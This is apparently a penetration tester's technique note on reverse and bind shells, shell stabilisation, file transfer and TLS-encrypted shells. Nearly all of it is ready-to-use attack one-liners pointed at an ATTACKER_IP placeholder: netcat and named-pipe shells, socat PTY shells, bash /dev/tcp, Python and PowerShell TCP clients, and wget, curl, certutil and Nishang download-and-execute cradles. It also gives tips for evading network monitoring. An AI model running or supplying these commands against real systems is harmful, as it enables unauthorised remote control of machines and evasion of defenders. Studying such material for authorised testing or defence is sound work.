---
title: "Shells and Listeners"
created: 2026-11-16
updated: 2026-11-16
type: technique
tags: [technique, exploitation, shells, netcat, socat]
---

# Shells and Listeners

How to catch, stabilise, and encrypt remote shells after gaining code execution.

---

## Reverse vs. Bind Shells

| | Reverse Shell | Bind Shell |
|--|--------------|------------|
| **Who listens** | You (attacker) | Target |
| **Who connects** | Target connects back to you | You connect to target |
| **Firewall** | Works when outbound is allowed (most common) | Works when inbound is allowed |
| **NAT** | Works behind NAT (target initiates outbound) | Blocked by NAT without port forwarding |
| **Usage** | Default choice — 90% of the time | Backup when outbound is blocked |

---

## Netcat

### Listener (attacker)

```bash
nc -lvnp 4444
```

- `-l` — listen
- `-v` — verbose (show connection info)
- `-n` — numeric only (skip DNS)
- `-p` — port

Ports above 1024 don't need sudo. Ports 80/443/53 need `sudo` but may bypass firewalls.

### Reverse shell (target → attacker)

```bash
nc ATTACKER_IP 4444 -e /bin/bash
```

### Bind shell (target listens, attacker connects)

```bash
# Target
nc -lvnp 8080 -e /bin/bash

# Attacker
nc TARGET_IP 8080
```

### Named pipe workaround (when -e is unavailable)

Many modern netcat versions remove `-e` for security. Use a named pipe instead:

```bash
# Reverse shell (no -e)
mkfifo /tmp/f; nc ATTACKER_IP 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# Bind shell (no -e)
mkfifo /tmp/f; nc -lvnp 8080 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

The named pipe creates a circular data flow: netcat passes commands to the shell, shell output flows back through the pipe to netcat.

---

## Socat

### Basic reverse shell

```bash
# Listener (attacker)
socat TCP-L:443 -

# Connection (target — Linux)
socat TCP:ATTACKER_IP:443 EXEC:"bash -li"

# Connection (target — Windows)
socat TCP:ATTACKER_IP:443 EXEC:powershell.exe,pipes
```

Windows needs `,pipes` for proper I/O handling.

### Basic bind shell

```bash
# Target
socat TCP-L:8080 EXEC:"bash -li"

# Attacker
socat TCP:TARGET_IP:8080 -
```

### Fully interactive TTY shell

```bash
# Listener (attacker)
socat TCP-L:5555 FILE:`tty`,raw,echo=0

# Connection (target)
socat TCP:ATTACKER_IP:5555 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

Target-side options: `pty` (pseudo-terminal), `stderr` (forward errors), `sigint` (Ctrl+C handling), `setsid` (job control), `sane` (standard terminal settings).

---

## Shell Stabilisation

### Python + stty recipe

```bash
# 1. Note your terminal size (on attacker, before catching shell)
stty size                    # e.g., 50 220

# 2. Catch the shell
nc -lvnp 4444

# 3. Spawn a TTY (in the raw shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 4. Set terminal type
export TERM=xterm

# 5. Background the shell
# Press Ctrl+Z

# 6. Fix your local terminal (on attacker)
stty raw -echo

# 7. Resume
fg

# 8. Set dimensions (in the remote shell)
stty rows 50 cols 220
```

If your terminal breaks after the shell dies: type `reset` + Enter (blind), or `stty sane`.

### rlwrap (enhanced netcat)

```bash
rlwrap nc -lvnp 4444
```

Adds command history (up/down arrows) and basic tab completion. Combine with the Python stabilisation steps above.

### Transferring files to the target

Serve the file from your machine, then download it on the target. Works for socat, payloads, or any tool.

```bash
# Attacker — serve files from current directory
sudo python3 -m http.server 80
```

**Linux target:**

```bash
wget http://ATTACKER_IP/payload -O /tmp/payload && chmod +x /tmp/payload
# or
curl http://ATTACKER_IP/payload -o /tmp/payload
```

**Windows target:**

```powershell
# PowerShell — download to disk
powershell "(New-Object System.Net.WebClient).Downloadfile('http://ATTACKER_IP/shell.exe','shell.exe')"

# PowerShell — Invoke-WebRequest
Invoke-WebRequest -Uri http://ATTACKER_IP/shell.exe -OutFile C:\Windows\Temp\shell.exe

# certutil — works when PowerShell is restricted
certutil -urlcache -split -f http://ATTACKER_IP/shell.exe shell.exe
```

`certutil` is a built-in Windows certificate utility — the download feature is a side effect, making it useful when PowerShell is blocked or monitored.

---

## Encrypted Shells (socat + SSL)

Wraps shell traffic in TLS — looks like normal HTTPS to network monitoring.

### Generate certificate (one time, on attacker)

```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem
```

### Encrypted reverse shell

```bash
# Listener (attacker)
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -

# Connection (target)
socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:"bash -li"
```

`verify=0` disables certificate verification (needed for self-signed certs).

### Encrypted + fully interactive TTY

```bash
# Listener (attacker)
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0

# Connection (target)
socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

Use port 443 — expected to carry SSL traffic, blends in with legitimate HTTPS.

---

## Script-Based Reverse Shells (no netcat needed)

### Bash TCP

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Uses bash's `/dev/tcp` pseudo-device. Not available on all bash builds.

### Python

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

### PowerShell (.NET TCPClient)

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Nishang (PowerShell framework)

Download `Invoke-PowerShellTcp.ps1` from nishang, serve it, and execute on target:

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444
```

### Payload selection strategy

| Factor | What to Check |
|--------|--------------|
| Target OS | Windows → PowerShell. Linux → bash, python, netcat |
| Available interpreters | `which python3`, `which perl`, `which ruby` |
| Netcat version | Has `-e`? Use it. Doesn't? Named pipe workaround |
| Network restrictions | Try different ports (80, 443, 53). Try different protocols |
| Detection concerns | PowerShell is heavily monitored on modern Windows |

Bookmark [revshells.com](https://www.revshells.com/) for quick one-liners in any language.

---

## Related Notes

- [[Web Shells]] — PHP, ASP, JSP webshells for HTTP-based access
- [[Post-Shell Actions]] — credential hunting, account creation after getting a shell
- [[Msfvenom]] — generating payloads with Metasploit
- [[Meterpreter]] — advanced post-exploitation shell
